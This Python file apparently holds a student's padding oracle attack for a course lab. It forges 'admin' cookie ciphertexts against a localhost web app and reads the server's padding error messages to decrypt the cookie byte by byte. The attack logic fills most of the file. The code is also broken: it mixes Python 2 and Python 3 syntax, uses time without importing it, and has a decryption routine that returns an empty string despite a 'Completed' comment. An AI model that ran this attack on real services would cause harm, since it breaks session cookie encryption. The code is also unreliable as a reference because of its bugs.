import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms
import base64
import binascii
from requests import codes, Session, cookies
LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.

def do_login_form(sess, username, password):
    data_dict = {"username":username,\
            "password":password,\
            "login":"Login"
            }
    response = sess.post(LOGIN_FORM_URL,data_dict)
    return response.status_code == codes.ok


class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = int(ciphers.algorithms.AES.block_size/8)

    @property
    def block_length(self):
        return self._block_size_bytes

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self,sess, ct):
        response = sess.post(self.url, {}, cookies={'admin': ct.hex()})
        #print(response.text)
        if 'Unspecified error.' in response.text:
            return -1
        elif 'Bad padding for admin cookie!' in response.text:
            return 0
        else:
            return 1
def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]

# reference:
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)

    sess= Session()
    assert(do_login_form(sess,"attacker","attacker"))
    print(po.block_length)
    c0, c1 = list(split_into_blocks(ctx, po.block_length))

    # i2 = [0] * po.block_length
    # p2 = [0] * po.block_length
    # for i in range(po.block_length-1,-1,-1):
    #     for b in range(256):
    #         prefix = c0[:i]
    #         pad_byte = po.block_length - i
    #         suffix = [pad_byte ^ bit for bit in i2[i+1:]]
    #         prefix.append(b)
    #         prefix += suffix
    #         intermediate = bytes(prefix)
    #         if po.test_ciphertext(sess,(intermediate + c1).hex())==1:
    #             i2[i] = b ^ pad_byte
    #             p2[i] = c0[i] ^ i2[i]

    # print(p2)
    decoded = [0] * po.block_length
    for i in range(15,-1,-1):
        pb = (po.block_length-i)
        for b in range(0,256):
            pre = c0[:i]
            post = [pb ^ val for val in decoded[i+1:]]
            ba = bytearray(pre)
            ba.append(b ^ c0[i])
            ba.extend(post)
            assert len(ba)==po.block_length
            mauled_c0 = bytes(ba)
            if i==0:
                if po.test_ciphertext(sess,(b'\x00'*16+mauled_c0 + c1))==1:
                    decoded[i] = b ^ c0[i] ^ pb
                    break
            else:
                if po.test_ciphertext(sess,(mauled_c0 + c1))==1:
                    decoded[i] = b ^ c0[i] ^ pb
                    break
    
    plain = [v ^ v1 for v,v1 in zip(c0,decoded)]
    plain = ''.join(map(chr,plain))
    print(plain)


    msg = ''
    # TODO: Implement padding oracle attack for 2 blocks of messages.
    return msg

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    # [Completed]: Implement padding oracle attack for arbitrary length message.
    P = ""
    for i in xrange(nblocks-1):
        print '\n=== Block: {}/{} ==='.format(i, nblocks)
        t_start = time.time()

        # Attack block by block
        ctx_2blocks = ctx_blocks[i] + ctx_blocks[i+1]
        p = po_attack_2blocks(po, ctx_2blocks)
        P = P + p 

        t_end = time.time() 
        print 'Time: {}s'.format(t_end-t_start) 
    return P

def do_attack(hex_cookie):
    po = PaddingOracle(SETCOINS_FORM_URL)
    po_attack(po,bytes.fromhex(hex_cookie))

if __name__ == "__main__":
    hex_cookie="e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d"
    # hex_cookie = "e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e60"
    print("sss")
    do_attack(hex_cookie)


    
